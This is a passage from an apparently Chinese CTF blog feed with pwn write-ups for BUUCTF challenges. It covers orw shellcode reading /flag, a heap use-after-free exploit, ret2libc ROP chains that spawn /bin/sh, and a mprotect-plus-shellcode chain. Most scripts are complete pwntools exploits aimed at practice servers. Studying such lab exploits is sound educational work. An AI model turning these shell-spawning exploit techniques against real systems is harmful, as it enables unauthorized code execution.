<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28836</span>)</span><br><span class="line">shellcode=<span class="string">&quot;&quot;</span></span><br><span class="line">shellcode += asm(<span class="string">&#x27;xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; mov ebx,esp;xor edx,edx;int 0x80;&#x27;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;&#x27;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&#x27;mov eax,0x4;mov bl,0x1;mov edx,0x30;int 0x80;&#x27;</span>)</span><br><span class="line">recv = p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">flag = p.recv(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28836</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwnable </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>堆漏洞uaf</title>
      <link href="/2021/11/17/hitcontraining_uaf/"/>
      <url>/2021/11/17/hitcontraining_uaf/</url>
      
        <content type="html"><![CDATA[<p>uaf</p><span id="more"></span><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>UAF漏洞全称为use after free，即释放后重用。漏洞产生的原因，在于内存在被释放后，但是指向指针并没有被删除，又被程序调用。比较常见的类型是C++对象，利用UAF修改C++的虚函数表导致的任意代码执行。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="BUUCTF-PWN——hitcontraining-uaf"><a href="#BUUCTF-PWN——hitcontraining-uaf" class="headerlink" title="[BUUCTF]PWN——hitcontraining_uaf"></a>[BUUCTF]PWN——hitcontraining_uaf</h3><ol><li>checksec检查，开了NX保护，32位</li></ol><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171548682.png" alt="image-20211117154838315"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171549415.png" alt="image-20211117154930218"></p><p>(1) add note</p><p><img src="https://img-blog.csdnimg.cn/20210602182659998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTU1NjQ0MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>add会申请两次内存,第一次申请8个字节,前四个字节指向print_note_content这个函数, 后四个字节指向我们写入的字符串(count会加1)</p><p>(2) delete note</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171557904.png" alt="image-20211117155714676"></p><p>只释放了堆块里的内容但没有将指针置0，存在uaf漏洞，并未指向NULL</p><p>(3)  print note</p><p><img src="https://img-blog.csdnimg.cn/2020090722450461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p><p>调用add申请的第一个8个字节中的前四个字节指向的函数,打印add创建的第二个chunk里的值</p><p><img src="https://img-blog.csdnimg.cn/20200907225210334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（4） shell</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171626096.png" alt="image-20211117162634035"></p><p>fastbin是单向链表遵循先进后出原则，申请A,B两个堆块后，先释放A ，后释放B，会在fastbin里形成链,此时，再次申请一个大小为0x8的内存C，并写入shellcode地址，那么第一个8个字节C就指向B，第二个8个字节C指向A，这时候我们写入的内容就会覆盖原有的，但原来的指针仍指向它，因而可以更改print_note_content函数为我们想要执行的函数。</p><p>在add中，我们只能对content部分进行操作，无法对print_note_content对应的部分即put段进行操作，所以我们要想办法，操作put段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据put段和content段中大小的不同，如果要申请到put段，payload大小应该为0x8，由于先进后出原则，先释放A，后释放B，此时第三次申请的put段指向B的put，content段指向A的put，content写入magic，调用print_note(0)时就调用了magic</span><br></pre></td></tr></table></figure><p>申请过程堆块变化：<br>add:</p><p><img src="https://img-blog.csdnimg.cn/2020090723023881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>free后：<br><img src="https://img-blog.csdnimg.cn/20200907230643335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>再次申请，写入shell<br><img src="https://img-blog.csdnimg.cn/20200907231047979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>先进后出原则</p><p>wp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;node4.buuoj.cn&#x27;,27609)</span></span><br><span class="line">shell_add = <span class="number">0x8048945</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span>(<span class="params">idx</span>):</span></span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">48</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">48</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,p32(shell_add))</span><br><span class="line">printf(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二种思路double free</span></span><br><span class="line"><span class="comment">#add(8,&#x27;aaaa&#x27;)</span></span><br><span class="line"><span class="comment">#delete(0)</span></span><br><span class="line"><span class="comment">#delete(0)</span></span><br><span class="line"><span class="comment">#add(40,&#x27;aaaa&#x27;)</span></span><br><span class="line"><span class="comment">#add(8,p32(shell_addr))</span></span><br><span class="line"><span class="comment">#printf(1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/mcmuyanga/article/details/108454183?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163714805316780261940769%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163714805316780261940769&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108454183.first_rank_v2_pc_rank_v29&amp;utm_term=hitcontraining_uaf&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/mcmuyanga/article/details/108454183?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163714805316780261940769%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163714805316780261940769&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108454183.first_rank_v2_pc_rank_v29&amp;utm_term=hitcontraining_uaf&amp;spm=1018.2226.3001.4187</a></p><p><a href="https://www.anquanke.com/post/id/190589">IE漏洞学习笔记（二）：UAF释放后重用</a></p><p><a href="https://www.anquanke.com/post/id/176694">One_gadget和UAF结合利用堆溢出漏洞研究</a></p>]]></content>
      
      
      <categories>
          
          <category> 堆 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出</title>
      <link href="/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>ret2libc，fmtstr</p><span id="more"></span><h2 id="一-基础知识补充"><a href="#一-基础知识补充" class="headerlink" title="一. 基础知识补充"></a>一. 基础知识补充</h2><ol><li><p>指令指针寄存器，是存放下次将要执行的指令在代码段的偏移量，RIP、EIP、IP(Instruction Pointer)分别为64位、32位、16位指令指针寄存器</p></li><li><p>以64位程序为例:</p><p>在执行call指令的时候，会向栈中压入call指令完成后下一条指令的地址，之后跳转到被调用的函数开始执行</p><p>push rbp ;将父函数栈底压入栈中<br>mov rbp, rsp ;将父函数栈顶变为子函数栈底<br>sub rsp, 0x70 ;向低地址处为子函数开辟栈帧</p><p>在函数调用结束的时候，程序会执行这两条指令<br>leave指令相当于执行了如下两条指令<br>mov esp ebp<br>pop ebp</p><p>ret指令则可以理解为将栈中的返回地址pop给rip的操作，从而回到父函数继续执行</p></li></ol><h2 id="二-ret2text"><a href="#二-ret2text" class="headerlink" title="二. ret2text"></a>二. ret2text</h2><p>栈溢出函数：strcpy</p><p>程序本身存在fflush函数，我们可以直接用它的sh来当作system的参数</p><h2 id="三-ret2libc"><a href="#三-ret2libc" class="headerlink" title="三. ret2libc"></a>三. ret2libc</h2><h3 id="泄露libc利用思路："><a href="#泄露libc利用思路：" class="headerlink" title="泄露libc利用思路："></a>泄露libc利用思路：</h3><ol><li>利用write函数来泄露程序的libc版本</li><li>知道libc版本后去计算程序里的system函数和字符串“/bin/sh”的地址</li><li>覆盖返回地址为system（‘/bin/sh’），获取shell</li></ol><h3 id="例题：2018-rop"><a href="#例题：2018-rop" class="headerlink" title="例题：2018_rop"></a>例题：2018_rop</h3><p><img src="https://img-blog.csdnimg.cn/20201006145006742.png#pic_center" alt="在这里插入图片描述"></p><p><code>1:</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>)) <span class="comment"># 获取write函数地址</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先填充‘a’*（0x88+4）造成溢出，覆盖到返回地址，返回地址填上write函数的plt地址来调用write函数，之后跟上main函数地址（我们要将程序程序重新执行一遍，再次利用输入点来进构造rop）<br>p32（0）+p32(write_addr)+p32(4)是在设置write函数的参数，对应函数原型看一下，32位程序是4位，所以这边写的4，对应的64位程序是8位。</p><p><code>2:</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)     <span class="comment">#计算偏移量</span></span><br><span class="line">                                <span class="comment">#偏移量=程序里的函数地址-libc里的函数地址</span></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>3:</code></p><p>构造rop获取shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br></pre></td></tr></table></figure><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27043</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是我在这么写的时候出现了 <code>timeout: the monitored command dumped core</code>,尝试泄露read函数的真实地址，再调用read函数来找到偏移。(后来找到问题有：payload的顺序错误也会导致timeout和找不到libc,timeout对应payload:填充+got表+plt表+main，找不到libc对应payload:填充+pop_rdi_ret+binsh_system,对应64位栈溢出，32位和64位不同)</p><p>64位查找pop_rdi:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary bjdctf_2020_babyrop |grep <span class="string">&quot;pop rdi&quot;</span></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./2018_rop&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28628</span>)</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x080484C6</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) </span><br><span class="line">payload += p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>)</span><br><span class="line">payload += p32(sys_addr) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>LibcSearcher使用方法：将exp放在libcsearcher的安装目录下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;25295&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./1&#x27;</span>)</span><br><span class="line">main=<span class="number">0x400b28</span></span><br><span class="line">rdi=<span class="number">0x400c83</span></span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line">pus_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()　　　　<span class="comment">#接收 encrypt  的两个 puts函数输出;</span></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))  <span class="comment">#得到 puts 函数 的地址;</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)       <span class="comment"># 得到 libc的版本;</span></span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)     <span class="comment">#    得到偏移地址</span></span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)     <span class="comment">#  利用偏移地址 得到 system函数的地址</span></span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)     <span class="comment">#               得到  bin/sh 的 地址</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)      <span class="comment">#   再一次执行 一遍流程</span></span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>plt表-》got表</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170953007.png" alt="image-20211117095319554"></p><h2 id="四-利用mprotect修改内存权限"><a href="#四-利用mprotect修改内存权限" class="headerlink" title="四.  利用mprotect修改内存权限"></a>四.  利用mprotect修改内存权限</h2><p>mprotect函数，可以用它来修改我们，内存栈的权限，让它可读可写可执行，进而修改内存权限。</p><h3 id="ROPgadget使用"><a href="#ROPgadget使用" class="headerlink" title="ROPgadget使用"></a>ROPgadget使用</h3><p>例题：not_the_same_3dsctf_2016</p><p>利用<code>mprotect</code>函数修改bss段为<code>0x7</code>即<code>0b111</code>，可读可写可执行权限，然后利用read函数读入shellcode，最后跳转到shellcode的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary not_the_same_3dsctf_2016--only &quot;pop|ret&quot;|grep pop</span><br></pre></td></tr></table></figure><p>需要利用ret指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret=0x806fcc8</p><p>ctrl+s调出程序的段表，将.got.plt段改为可读可写可执行,addr=0x80eb000</p><p>将返回地址填写成read函数，设置read函数的参数，之后将返回地址改为我们修改为可读可写可执行的地址，最后读入shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mprotect函数的利用，将目标地址：.got.plt或.bss段 修改为可读可写可执行</span></span><br><span class="line"><span class="built_in">int</span> mprotect(const void *start, size_t <span class="built_in">len</span>, <span class="built_in">int</span> prot);</span><br><span class="line">argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (ida-ctrl+s 查看.got.plt/.bss起始地址) </span><br><span class="line">argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 <span class="number">0x1000</span> (<span class="number">0x1000</span>通过程序启动时查看该内存块的大小的到的)</span><br><span class="line">argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 <span class="number">7</span> = <span class="number">4</span> + <span class="number">2</span> +<span class="number">1</span> (rwx)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># ROPgadget --binary get_started_3dsctf_2016 --only &#x27;pop|ret&#x27; | grep pop</span></span><br><span class="line">pop3_addr = <span class="number">0x0806fcc8</span> <span class="comment"># pop esi ; pop ebx ; pop edx ; ret</span></span><br><span class="line">payload = <span class="number">0x2D</span> * <span class="string">&#x27;a&#x27;</span> + <span class="number">0x4</span> * <span class="string">&#x27;b&#x27;</span> + p32(elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload += p32(pop3_addr) <span class="comment"># 返回地址覆盖为pop3，目的为了栈还原，因为mprotect传入了三个参数，需要连续3个pop</span></span><br><span class="line">payload += p32(argu1) + p32(argu2) + p32(argu3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 紧接着返回地址为 read对修改的目标地址写入shellcode</span></span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line">payload += p32(pop3_addr) <span class="comment"># 同样栈还原，为了执行紧接着的 目标地址</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(argu1) + p32(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># read写完后 写入执行的目标地址</span></span><br><span class="line">payload += p32(argu1)</span><br><span class="line"><span class="comment"># 先进行sendline执行到read等待输入</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># 继续sendline发送shellcode</span></span><br><span class="line">sh.sendline(asm(shellcraft.sh(), arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>))</span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 